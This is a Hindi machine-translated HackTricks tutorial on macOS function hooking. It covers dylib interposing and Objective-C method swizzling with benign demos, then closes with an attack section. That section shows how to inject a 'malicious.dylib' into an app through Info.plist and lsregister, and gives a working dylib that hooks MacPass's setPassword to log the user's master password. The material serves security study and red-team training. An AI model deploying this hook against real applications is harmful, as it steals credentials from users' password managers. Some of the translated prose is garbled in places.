# macOS Function Hooking

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* पर फॉलो\*\* करें।
* **हैकिंग ट्रिक्स साझा करें** हैकट्रिक्स और हैकट्रिक्स क्लाउड गिटहब रेपो में पीआर जमा करके।

</details>

## कार्य इंटरपोज़िंग

एक **dylib** बनाएं जिसमें **`__interpose`** खंड (या एक खंड जिसे **`S_INTERPOSING`** फ्लैग के साथ चिह्नित किया गया हो) हो, जिसमें **कार्य संकेतक** के जोड़ों का संदर्भ होता है जो **मूल** और **प्रतिस्थापन** कार्यों को संदर्भित करते हैं।

फिर, **`DYLD_INSERT_LIBRARIES`** के साथ dylib **इंजेक्ट** करें (इंटरपोजिंग को मुख्य ऐप लोड होने से पहले होना चाहिए)। स्वाभाविक रूप से [**`DYLD_INSERT_LIBRARIES`** का उपयोग करने पर लागू **प्रतिबंध** यहां भी लागू होते हैं](macos-library-injection/#check-restrictions)।

### printf को इंटरपोज़ करें

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
यहाँ हम एक और उदाहरण देखेंगे जिसमें हम फ़ंक्शन हुकिंग का उपयोग करके `open` फ़ंक्शन को हुक करेंगे। इसके लिए हम `DYLD_INSERT_LIBRARIES` वायरेबल का उपयोग करेंगे। यह उदाहरण `open` फ़ंक्शन को हुक करके फ़ाइल खोलने की क्रिया को अवरोधित करेगा। %\}

```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endtab %}
{% endtabs %}

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```

## Method Swizzling

ObjectiveC में यह एक तरीका है कि एक मेथड को कैसे बुलाया जाता है: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

इसमें **object**, **method** और **params** की आवश्यकता होती है। और जब एक मेथड को बुलाया जाता है तो **msg भेजा जाता है** फ़ंक्शन **`objc_msgSend`** का उपयोग करके: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

यहाँ object है **`someObject`**, method है **`@selector(method1p1:p2:)`** और arguments हैं **value1**, **value2**।

ऑब्जेक्ट संरचनाओं का पालन करते हुए, एक **methods का अर्रेय** तक पहुंचना संभव है जहाँ **नाम** और **मेथड कोड के पॉइंटर** स्थित हैं।

{% hint style="danger" %}
ध्यान दें कि क्योंकि methods और classes अपने नामों के आधार पर एक्सेस किए जाते हैं, इस जानकारी को बाइनरी में स्टोर किया जाता है, इसलिए इसे `otool -ov </path/bin>` या [`class-dump </path/bin>`](https://github.com/nygard/class-dump) के साथ पुनः प्राप्त किया जा सकता है।
{% endhint %}

### रॉ मेथड तक पहुंचना

मेथड्स की जानकारी तक पहुंचना संभव है जैसे कि नाम, पैरामीटरों की संख्या या पता जैसे कि निम्नलिखित उदाहरण में:

```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```

### Method Swizzling with method\_exchangeImplementations

फ़ंक्शन **`method_exchangeImplementations`** को एक फ़ंक्शन के **इम्प्लीमेंटेशन** के **पते** को **बदलने** की अनुमति देता है **दूसरे के लिए**।

{% hint style="danger" %}
तो जब एक फ़ंक्शन को कॉल किया जाता है तो **वहाँ दूसरा वाला** चलाया जाता है।
{% endhint %}

```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```

{% hint style="warning" %}
इस मामले में अगर **वैध** मेथड की **अमलन कोड** **मेथड का नाम** **सत्यापित** करता है तो यह स्विज़लिंग को **पहचान** सकता है और इसे चलने से रोक सकता है।

निम्नलिखित तकनीक में यह प्रतिबंध नहीं है।
{% endhint %}

### method\_setImplementation के साथ मेथड स्विज़लिंग

पिछला प्रारूप अजीब है क्योंकि आप एक से दूसरे मेथड के अमलन को बदल रहे हैं। **`method_setImplementation`** फ़ंक्शन का उपयोग करके आप एक **मेथड के अमलन को दूसरे के लिए बदल सकते हैं**।

बस याद रखें कि अगर आप नए अमलन से उसे कॉल करने जा रहे हैं तो **मूल वाले के अमलन के पते को संग्रहित करें** क्योंकि बाद में उस पते को ढूंढना बहुत कठिन हो जाएगा।

```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```

## हुकिंग हमले की विधि

इस पृष्ठ पर विभिन्न तरीके चरणों को हुक करने के बारे में चर्चा की गई थी। हालांकि, इसमें **प्रक्रिया के अंदर कोड चलाने की आक्रमण करने** शामिल थे।

इसे करने के लिए सबसे सरल तकनीक [डाइल्ड को पर्यावरण चरवाहों या हाइजैकिंग के माध्यम से इंजेक्शन](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md) करना है। हालांकि, मुझे लगता है कि यह [डाइलिब प्रक्रिया इंजेक्शन](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port) के माध्यम से भी किया जा सकता है।

हालांकि, दोनों विकल्प **सीमित** हैं **सुरक्षित नहीं** बाइनरी/प्रक्रियाओं के लिए। अधिक जानकारी प्राप्त करने के लिए प्रत्येक तकनीक की जांच करें।

हालांकि, एक फ़ंक्शन हुकिंग हमला बहुत विशिष्ट है, एक हमलावर इसे **प्रक्रिया के अंदर से संवेदनशील जानकारी चुराने** के लिए करेगा (यदि आप ऐसा नहीं करेंगे तो आप बस एक प्रक्रिया इंजेक्शन हमला करेंगे)। और यह संवेदनशील जानकारी उपयोगकर्ता डाउनलोड किए गए ऐप्स जैसे MacPass में स्थित हो सकती है।

तो हमलावर वेक्टर या तो एक दुर्भाग्यता खोजने या एप्लिकेशन के Info.plist के माध्यम से **`DYLD_INSERT_LIBRARIES`** एनवायरनमेंट चरवाहों को इंजेक्ट करने के लिए एप्लिकेशन के साइनेचर को छीनने का प्रयास करेगा और कुछ इस प्रकार कुछ जोड़ेंगे:

```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```

और फिर **एप्लिकेशन को पुनः पंजीकृत** करें:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

उस लाइब्रेरी में उक्त जानकारी को बाहर भेजने के लिए हुकिंग कोड जोड़ें: पासवर्ड, संदेश...

{% hint style="danger" %}
ध्यान दें कि macOS के नए संस्करणों में अगर आप एप्लिकेशन बाइनरी के **सिग्नेचर को हटा देते हैं** और यह पहले से ही चल रहा था, तो macOS **अब एप्लिकेशन को नहीं चलाएगा**।
{% endhint %}

#### लाइब्रेरी उदाहरण

```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```

## संदर्भ

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह **The PEASS Family** की खोज करें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>
